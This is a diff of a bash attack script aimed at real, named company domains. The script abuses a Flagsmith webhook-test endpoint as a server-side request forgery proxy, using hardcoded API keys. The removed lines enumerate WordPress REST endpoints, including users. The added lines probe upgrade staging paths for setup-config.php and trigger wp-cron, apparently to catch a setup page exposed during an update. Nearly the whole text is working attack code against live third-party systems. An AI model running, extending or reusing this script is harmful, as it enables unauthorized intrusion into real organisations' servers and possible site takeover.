@@ -1,7 +1,7 @@
 #!/bin/bash
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-KEY="5c835df901f2674a0788e25484a73eb42be31713"
-EKEY="8uLGCkxcX7sfS5GDFvy3Ah"
+KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
+EKEY="Ldqx3Z27VxYrTFXgWYiZhb"
 
 SSRF() {
   curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
@@ -11,28 +11,24 @@ SSRF() {
 
 echo "IP: $(curl -s https://ifconfig.me)"
 
-# Test WP REST API public endpoints (via ?rest_route= to avoid /wp-json/ 404)
-echo "=== REST API DISCOVERY ==="
-echo -n "root -> "
-SSRF "https://koinp2p.com/?rest_route=/"
+# Step 1: Check if upgrade staging directory already exists
+echo "=== CHECK STAGING ==="
+# Try common WP version staging paths
+for ver in "7.1.4" "6.7.12" "6.7.11" "6.8" "6.8.1" "7.0" "7.1" "7.1.3"; do
+  echo -n "wordpress-$ver -> "
+  SSRF "https://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php"
+  echo ""
+done
+
+# Step 2: Trigger wp-cron to initiate auto-update
+echo "=== TRIGGER CRON ==="
+SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
 echo ""
 
-echo -n "posts -> "
-SSRF "https://koinp2p.com/?rest_route=/wp/v2/posts"
-echo ""
-
-echo -n "pages -> "
-SSRF "https://koinp2p.com/?rest_route=/wp/v2/pages"
-echo ""
-
-echo -n "comments -> "
-SSRF "https://koinp2p.com/?rest_route=/wp/v2/comments"
-echo ""
-
-echo -n "users -> "
-SSRF "https://koinp2p.com/?rest_route=/wp/v2/users"
-echo ""
-
-echo -n "search -> "
-SSRF "https://koinp2p.com/?rest_route=/wp/v2/search&search=admin"
-echo ""
+# Step 3: After triggering cron, immediately check staging again
+echo "=== POST-CRON STAGING ==="
+for ver in "7.1.4" "6.7.12"; do
+  echo -n "wordpress-$ver -> "
+  SSRF "https://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php"
+  echo ""
+done
